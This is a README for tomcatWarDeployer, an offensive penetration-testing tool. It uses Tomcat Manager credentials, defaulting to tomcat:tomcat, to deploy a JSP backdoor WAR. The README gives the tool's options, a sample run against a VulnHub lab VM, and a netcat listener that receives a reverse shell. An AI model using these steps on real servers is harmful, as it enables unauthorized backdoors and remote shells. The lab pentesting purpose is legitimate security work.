## tomcatWarDeployer
Apache Tomcat auto WAR deployment &amp; pwning penetration testing tool.

### What is it?
This is a penetration testing tool intended to leverage Apache Tomcat credentials in order to automatically generate and deploy JSP Backdoor, as well as invoke it afterwards and provide nice shell (either via web gui, listening port binded on remote machine or as a reverse tcp payload connecting back to the adversary). 

In practice, it generates JSP backdoor WAR package on-the-fly and deploys it at the Apache Tomcat Manager Application, using valid HTTP Authentication credentials that pentester provided (or custom ones, in the end, we all love *tomcat:tomcat* ). 

### Usage
As simple as providing server's address with port, as a IP:PORT pair. 
Here goes the help:

```
user$ python tomcatWarDeployer.py --help

    Apache Tomcat auto WAR deployment & launching tool
    Mariusz B. / MGeeky '16

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
    
Usage: tomcatWarDeployer.py [options] server

  server		Specifies server address. Please also include port after colon.

Options:
  -h, --help            show this help message and exit
  -R APPNAME, --remove=APPNAME
                        Remove deployed app with specified name. Can be used
                        for post-assessment cleaning
  -X PASSWORD, --shellpass=PASSWORD
                        Specifies authentication password for uploaded shell,
                        to prevent unauthenticated usage. Default: randomly
                        generated. Specify "None" to leave the shell
                        unauthenticated.
  -t TITLE, --title=TITLE
                        Specifies head>title for uploaded JSP WAR payload.
                        Default: "JSP Application"
  -n APPNAME, --name=APPNAME
                        Specifies JSP application name. Default: "jsp_app"
  -x, --unload          Unload existing JSP Application with the same name.
                        Default: no.
  -C, --noconnect       Do not connect to the spawned shell immediately. By
                        default this program will connect to the spawned
                        shell, specifying this option let's you use other
                        handlers like Metasploit, NetCat and so on.
  -f WARFILE, --file=WARFILE
                        Custom WAR file to deploy. By default the script will
                        generate own WAR file on-the-fly.

  General options:
    -v, --verbose       Verbose mode.
    -U USER, --user=USER
                        Tomcat Manager Web Application HTTP Auth username.
                        Default="tomcat"
    -P PASS, --pass=PASS
                        Tomcat Manager Web Application HTTP Auth password.
                        Default="tomcat"
```

And sample usage on [Kevgir 1 VM by canyoupwn.me](https://www.vulnhub.com/entry/kevgir-1,137/) running at 192.168.56.100:8080 :

```
user$ python tomcatWarDeployer.py -C -x -v -H 192.168.56.101 -p 4545 -n shell 192.168.56.100:8080

    Apache Tomcat auto WAR deployment & launching tool
    Mariusz B. / MGeeky '16

Penetration Testing utility aiming at presenting danger of leaving Tomcat misconfigured.
    
INFO: Reverse shell will connect to: 192.168.56.101:4545.
DEBUG: Browsing to "http://192.168.56.100:8080/manager/"... Creds: tomcat:tomcat
DEBUG: Apache Tomcat Manager Application reached & validated.
DEBUG: Generating JSP WAR backdoor code...
DEBUG: Preparing additional code for Reverse TCP shell
DEBUG: Generating temporary structure for shell WAR at: "/tmp/tmpzndaGR"
DEBUG: Working with Java at version: 1.8.0_60
DEBUG: Generating web.xml with servlet-name: "JSP Application"
DEBUG: Generating WAR file at: "/tmp/shell.war"
DEBUG: added manifest
adding: files/(in = 0) (out= 0)(stored 0%)
adding: files/WEB-INF/(in = 0) (out= 0)(stored 0%)
adding: files/WEB-INF/web.xml(in = 541) (out= 254)(deflated 53%)
adding: files/META-INF/(in = 0) (out= 0)(stored 0%)
adding: files/META-INF/MANIFEST.MF(in = 68) (out= 67)(deflated 1%)
adding: index.jsp(in = 4684) (out= 1597)(deflated 65%)
DEBUG: WAR file structure:
DEBUG: /tmp/tmpzndaGR
├── files
│   ├── META-INF
│   │   └── MANIFEST.MF
│   └── WEB-INF
│       └── web.xml
└── index.jsp

3 directories, 3 files
WARNING: Application with name: "shell" is already deployed.
DEBUG: Unloading existing one...
DEBUG: Unloading application: "http://192.168.56.100:8080/shell/"
DEBUG: Succeeded.
DEBUG: Deploying application: shell from file: "/tmp/shell.war"
DEBUG: Removing temporary WAR directory: "/tmp/tmpzndaGR"
DEBUG: Succeeded, invoking it...
DEBUG: Invoking application at url: "http://192.168.56.100:8080/shell/"
DEBUG: Adding 'X-Pass: b8vYQ9EU7suV' header for shell functionality authentication.
WARNING: Set up your incoming shell listener, I'm giving you 3 seconds.
INFO: JSP Backdoor up & running on http://192.168.56.100:8080/shell/
INFO: Happy pwning, here take that password for web shell: 'b8vYQ9EU7suV'
```

Which will result in the following JSP application accessible remotely via WEB:
![JSP backdoor gui](screen1.png)

As one can see, there is password needed for leveraging deployed backdoor, preventing thus unauthenticated access during conducted assessment.

Also, this particular example **performs reverse shell popping** by connecting here to the *192.168.56.101:4545*. 
There one can observe:

```
user $ nc -klvp 4545
listening on [any] 4545 ...
192.168.56.100: inverse host lookup failed: Unknown host
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.100] 44423
id
uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)
```

Summing up, user has spawned WEB application providing WEB backdoor, authenticated via POST 'password' parameter that can be specified by user or randomly generated by the program. Then, the application upon receiving *X-Pass* header in the invocation phase, spawned reverse connection to our *netcat* handler. The HTTP header is being requested here in order to prevent user refreshing WEB gui and keep trying to bind or reverse connect. Also this makes use of authentication to reach that code.

That would be all I guess. 

### TODO

* ~~Implement bind & reverse tcp payload functionality~~ as well as some pty to interact with it
* Finish implementing noconnect and connect functionality
* Test it on tomcat8


